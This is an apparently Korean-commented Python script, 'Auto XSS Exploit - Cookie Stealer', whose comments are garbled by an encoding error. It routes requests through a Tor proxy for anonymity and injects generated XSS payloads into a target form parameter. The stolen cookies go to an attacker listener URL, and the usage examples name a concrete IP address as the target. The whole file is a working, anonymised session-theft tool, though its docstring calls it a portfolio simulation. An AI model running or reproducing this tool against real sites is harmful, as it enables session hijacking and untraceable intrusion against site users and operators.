#!/usr/bin/env python3
"""
Auto XSS Exploit - ìë™í™”ëœ XSS ê³µê²© ìŠ¤í¬ë¦½íŠ¸
í¬íŠ¸í´ë¦¬ì˜¤ ëª©ì : Tor í”„ë¡ì‹œë¥¼ í†µí•œ ìµëª… ê³µê²© ì‹œë®¬ë ˆì´ì…˜
"""

import requests
import time
import sys
import json
from urllib.parse import urlencode
from payload_generator import PayloadGenerator
import argparse
import logging

# ANSI ìƒ‰ìƒ ì½”ë“œ
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def setup_tor_session():
    """Tor í”„ë¡ì‹œ ì„¸ì…˜ ì„¤ì •"""
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    })
    return session

def test_tor_connection(session):
    """Tor ì—°ê²° í…ŒìŠ¤íŠ¸"""
    try:
        response = session.get('https://check.torproject.org/api/ip', timeout=10)
        data = response.json()
        if data.get('IsTor'):
            logging.info(f"{Colors.GREEN}âœ“ Tor ì—°ê²° ì„±ê³µ! IP: {data.get('IP')}{Colors.END}")
            return True
        else:
            logging.warning(f"{Colors.YELLOW}âš  Torë¥¼ í†µí•˜ì§€ ì•ŠìŒ. ì¼ë°˜ ì—°ê²° ì‚¬ìš©.{Colors.END}")
            return False
    except Exception as e:
        logging.warning(f"{Colors.YELLOW}âš  Tor ì—°ê²° ì‹¤íŒ¨: {e}. ì¼ë°˜ ì—°ê²° ì‚¬ìš©.{Colors.END}")
        return False

def inject_payload(target_url, payload, session, method='POST', param='content'):
    """
    í˜ì´ë¡œë“œë¥¼ íƒ€ê²Ÿì— ì£¼ì…

    Args:
        target_url: ê³µê²© ëŒ€ìƒ URL
        payload: XSS í˜ì´ë¡œë“œ
        session: requests ì„¸ì…˜
        method: HTTP ë©”ì„œë“œ (GET/POST)
        param: ì£¼ì…í•  íŒŒë¼ë¯¸í„° ì´ë¦„
    """
    try:
        if method.upper() == 'POST':
            data = {param: payload}
            response = session.post(target_url, data=data, timeout=10)
        else:
            params = {param: payload}
            response = session.get(target_url, params=params, timeout=10)

        return {
            'status_code': response.status_code,
            'success': response.status_code == 200,
            'reflected': payload in response.text if len(payload) < 100 else False,
            'response_length': len(response.text)
        }
    except Exception as e:
        return {
            'status_code': 0,
            'success': False,
            'error': str(e)
        }

def auto_exploit(target_url, listener_url, use_tor=True, method='POST', param='content', delay=2):
    """
    ìë™í™”ëœ XSS ìµìŠ¤í”Œë¡œì‡

    Args:
        target_url: ê³µê²© ëŒ€ìƒ URL (ì˜ˆ: http://3.34.90.201/add_comment.php)
        listener_url: ì¿ í‚¤ ë¦¬ìŠ¤ë„ˆ URL (ì˜ˆ: http://YOUR_IP:8888/steal)
        use_tor: Tor ì‚¬ìš© ì—¬ë¶€
        method: HTTP ë©”ì„œë“œ
        param: ì£¼ì… íŒŒë¼ë¯¸í„°
        delay: í˜ì´ë¡œë“œ ê°„ ì§€ì—° ì‹œê°„
    """
    print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.HEADER}ğŸ¯ Auto XSS Exploit - Cookie Stealer{Colors.END}")
    print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")

    # ì„¸ì…˜ ì„¤ì •
    if use_tor:
        session = setup_tor_session()
        test_tor_connection(session)
    else:
        session = requests.Session()

    # í˜ì´ë¡œë“œ ìƒì„±ê¸°
    generator = PayloadGenerator(listener_url)
    payloads = generator.generate_all()

    print(f"{Colors.BLUE}ğŸ“¡ Target: {target_url}{Colors.END}")
    print(f"{Colors.BLUE}ğŸ“¡ Listener: {listener_url}{Colors.END}")
    print(f"{Colors.BLUE}ğŸ”§ Method: {method} | Param: {param}{Colors.END}")
    print(f"{Colors.BLUE}ğŸ•µï¸  Tor: {'Enabled' if use_tor else 'Disabled'}{Colors.END}")
    print(f"{Colors.BLUE}ğŸ“¦ Payloads: {len(payloads)}{Colors.END}\n")

    results = []
    success_count = 0

    for idx, (name, payload) in enumerate(payloads.items(), 1):
        print(f"{Colors.YELLOW}[{idx}/{len(payloads)}] Testing: {name}{Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        result = inject_payload(target_url, payload, session, method, param)
        result['payload_name'] = name
        result['payload'] = payload
        results.append(result)

        if result['success']:
            if result.get('reflected', False):
                print(f"   {Colors.GREEN}âœ“ Injected & Reflected!{Colors.END}")
                success_count += 1
            else:
                print(f"   {Colors.GREEN}âœ“ Injected (blind){Colors.END}")
                success_count += 1
        else:
            print(f"   {Colors.RED}âœ— Failed: {result.get('error', 'Unknown error')}{Colors.END}")

        time.sleep(delay)

    # ê²°ê³¼ ìš”ì•½
    print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.HEADER}ğŸ“Š Results Summary{Colors.END}")
    print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
    print(f"Total Payloads: {len(payloads)}")
    print(f"{Colors.GREEN}Successful Injections: {success_count}{Colors.END}")
    print(f"{Colors.RED}Failed Injections: {len(payloads) - success_count}{Colors.END}\n")

    # ê²°ê³¼ ì €ì¥
    with open('exploit_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f"ğŸ’¾ Results saved to: exploit_results.json\n")

    # ì„±ê³µí•œ í˜ì´ë¡œë“œ ëª©ë¡
    if success_count > 0:
        print(f"{Colors.GREEN}âœ“ Successful Payloads:{Colors.END}")
        for r in results:
            if r['success']:
                print(f"   - {r['payload_name']}")
        print()

    return results

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Auto XSS Exploit - Cookie Stealer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # ê¸°ë³¸ ì‹¤í–‰ (Tor ì‚¬ìš©)
  python3 auto_exploit.py -t http://3.34.90.201/add_comment.php -l http://YOUR_IP:8888/steal

  # Tor ì—†ì´ ì‹¤í–‰
  python3 auto_exploit.py -t http://3.34.90.201/add_comment.php -l http://YOUR_IP:8888/steal --no-tor

  # GET ë©”ì„œë“œ ì‚¬ìš©
  python3 auto_exploit.py -t http://3.34.90.201/search.php -l http://YOUR_IP:8888/steal -m GET -p query

  # ì§€ì—° ì‹œê°„ ì¡°ì •
  python3 auto_exploit.py -t http://3.34.90.201/add_comment.php -l http://YOUR_IP:8888/steal -d 5
        '''
    )

    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://3.34.90.201/add_comment.php)')
    parser.add_argument('-l', '--listener', required=True, help='Cookie listener URL (e.g., http://YOUR_IP:8888/steal)')
    parser.add_argument('-m', '--method', default='POST', choices=['GET', 'POST'], help='HTTP method (default: POST)')
    parser.add_argument('-p', '--param', default='content', help='Parameter name to inject (default: content)')
    parser.add_argument('-d', '--delay', type=float, default=2, help='Delay between requests in seconds (default: 2)')
    parser.add_argument('--no-tor', action='store_true', help='Disable Tor proxy')

    args = parser.parse_args()

    # ë¡œê¹… ì„¤ì •
    logging.basicConfig(
        level=logging.INFO,
        format='%(message)s'
    )

    try:
        auto_exploit(
            target_url=args.target,
            listener_url=args.listener,
            use_tor=not args.no_tor,
            method=args.method,
            param=args.param,
            delay=args.delay
        )
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}âš  Exploit interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}âŒ Error: {e}{Colors.END}")
        sys.exit(1)
